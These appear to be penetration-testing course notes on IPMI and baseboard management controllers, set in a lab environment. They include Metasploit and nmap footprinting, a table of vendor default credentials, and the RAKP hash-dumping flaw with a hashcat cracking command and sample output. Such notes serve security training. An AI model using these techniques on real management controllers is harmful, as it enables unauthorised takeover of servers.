### IPMI
* [Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`)
* Used for system management and monitoring even if they are powered off or unresponsive
	* Monitors system temperature, voltage, fan status, and power supplies
* Acts as an autonomous subsystem and work independently of the host's BIOS, CPU, firmware, and underlying operating system
* Operates via direct network connection to systems hardware
* Does not require access to OS via login shell
* Can also be used for remote upgrades to systems without requiring physical access to the target host
* Typically used in three ways
	-   Before the OS has booted to modify BIOS settings
	-   When the host is fully powered down
	-   Access to a host after a system failure
- Can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP

### Footprinting the Service
* IPMI communicates over UDP port `623`
* Systems that use IPMI are called Baseboard Management Controllers (`BMCs`)
	* Typically implemented as embedded ARM systems running Linux
	* Connect directly to host's motherboard
* Most often use BMCs are HP iLO, Dell DRAC, and Supermicro IPMI
* If we would be able to access BMCs
	* We gain full access to the host motherboard 
	* Able to monitor, reboot, power off, or reinstall host OS
	* Nearly equivalent to gaining physical access
* Many BMCs expose a web-based management console
	* Like Telnet or SSH

```sh
$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

* Administrators often use default passwords
* Some unique default passwords to keep in our cheatsheets include

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                          |

### Dangerous Settings
* If default passwords do not work, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0
* During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place
	* Can be leveraged to obtain the password hash for ANY valid user account on the BMC
	* Hashes can then be crack offline via `Hashcat` mode `7300`
*  In the event of an HP iLO using a factory default password
	* Use this Hashcat mash attack command which tries all combinations of upper case letters and numbers for an eight char password
	* `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`

```sh
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```